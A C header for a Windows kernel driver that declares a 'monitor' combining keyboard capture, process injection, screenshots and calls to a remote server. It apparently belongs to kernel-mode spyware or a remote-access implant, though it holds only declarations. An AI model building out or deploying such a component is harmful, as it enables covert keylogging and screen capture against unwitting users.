#pragma once

#include <inc/drvmain.h>

#include <inc/sysworker.h>
#include <inc/mwsk.h>
#include <inc/keybrd.h>
#include <inc/inject.h>
#include <inc/thash.h>
#include <inc/pallocator.h>
#include <h/drvioctl.h>
#include <inc/processtable.h>
#include <inc/servercon.h>
#include <inc/srequest.h>
#include <inc/eventlog.h>

#define MONITOR_STATE_STOPPED 1
#define MONITOR_STATE_STARTED 2

typedef struct _MONITOR {
	PDRIVER_OBJECT	DriverObject;
	SYSWORKER		NetWorker;
	SYSWORKER		RequestWorker;
	PMWSK_CONTEXT   WskContext;
	volatile LONG	State;
	KGUARDED_MUTEX	Mutex;
	INJECT_BLOCK	Inject;
	PROCESS_TABLE	ProcessTable;
	KBD_CONTEXT		Kbd;
	SERVER_CON_POOL ConPool;
	EVENT_LOG		EventLog;
	char			*clientId;
	char			*authId;
	char			*hostId;
} MONITOR, *PMONITOR;

VOID
	MonitorInit(PDRIVER_OBJECT	DriverObject);

NTSTATUS
    MonitorStart(PKMON_INIT InitData);

NTSTATUS
    MonitorStop(PKMON_RELEASE ReleaseData);

NTSTATUS
	MonitorOpenWinsta(POPEN_WINSTA Winsta);

NTSTATUS
	MonitorOpenDesktop(POPEN_DESKTOP openDesktop);


PMONITOR
	MonitorGetInstance(VOID);

PSREQUEST
	MonitorCallServer(PSREQUEST request);

NTSTATUS
MonitorScreenshot(PKMON_SCREENSHOT ScreenShot);

